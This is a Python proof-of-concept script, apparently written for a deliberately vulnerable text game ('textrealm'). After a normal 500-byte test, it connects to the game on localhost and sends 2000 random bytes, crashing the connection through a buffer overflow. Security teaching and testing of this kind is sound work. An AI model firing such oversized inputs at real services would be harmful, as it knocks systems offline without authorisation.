"""
This is a simple proof-of-concept script to demonstrate a ver simple buffer overflow vulnerability that impacts both the Linux and Windows version of the vulnerable game. There is just one script for the simple overflow PoC because the vulnerability exists in the same spot and is triggered by the same input entry point for both platforms.

TL;DR: When the client connects to the game just send a string longer than 1024 bytes and the client connection will crash which is reflected in logging (textrealm/game_logs/textrealm.log).
"""

import socket
import random
import string

HOST = "127.0.0.1"
PORT = 9999
RECV_CHUNK = 4096

PROMPT = b"> "


def print_banner(title):
    width = 70
    print()
    print("#" * width)
    print(f"# {title}")
    print("#" * width)
    print()


def is_game_running(host, port):
    """Quick TCP connect check - True if something is listening on host:port."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    try:
        s.connect((host, port))
        return True
    except OSError:
        return False
    finally:
        s.close()


def random_bytes(n):
    return "".join(random.choice(string.ascii_letters) for _ in range(n)).encode()


def recv_until_prompt(sock, timeout=3):
    """Block until PROMPT has been seen in the accumulated data. Raises
    whatever OSError the socket raises (e.g. ConnectionResetError) if the
    peer closes/crashes first."""
    sock.settimeout(timeout)
    data = b""
    while PROMPT not in data:
        chunk = sock.recv(RECV_CHUNK)
        if not chunk:
            raise ConnectionError("connection closed by peer")
        data += chunk
    return data


def print_crash_banner(err):
    code = getattr(err, "errno", None)
    desc = getattr(err, "strerror", None) or str(err)
    print(f"!!! CONNECTION TERMINATED WITH CLIENT ERROR CODE {code} ({desc}) "
          f"- THIS IS THE SERVER CRASHING FROM THE BUFFER OVERFLOW !!!")


def run_test(sock, label, payload):
    """Send `payload` (as if it had been typed + Enter) and show it the
    way a terminal session would: the prompt, the typed line echoed right
    after it, then the server's actual response. Returns False if the
    connection died (the overflow crashing the server)."""
    print_banner(label)

    try:
        sock.sendall(payload + b"\r\n")
    except OSError as e:
        print_crash_banner(e)
        return False

    print("INPUT STRING:\n" + payload.decode(errors="replace") + "\n")  

    try:
        response = recv_until_prompt(sock)
    except OSError as e:
        print_crash_banner(e)
        return False

    print("SERVER RESPONSE:\n  " + response.decode(errors="replace"))
    return True


def main():
    if not is_game_running(HOST, PORT):
        print(f"[-] Nothing is listening on {HOST}:{PORT} - is the game running?")
        return

    print(f"[+] Game is running on {HOST}:{PORT}, connecting...")
    sock = socket.create_connection((HOST, PORT))

    banner = recv_until_prompt(sock)
    print(banner.decode(errors="replace"))

    if not run_test(sock, "A VALID INPUT TEST (500 bytes)", random_bytes(500)):
        sock.close()
        return

    run_test(sock, "INPUT TEST THAT WOULD TRIGGER OVERFLOW (2000 bytes)", random_bytes(2000))

    sock.close()


if __name__ == "__main__":
    main()
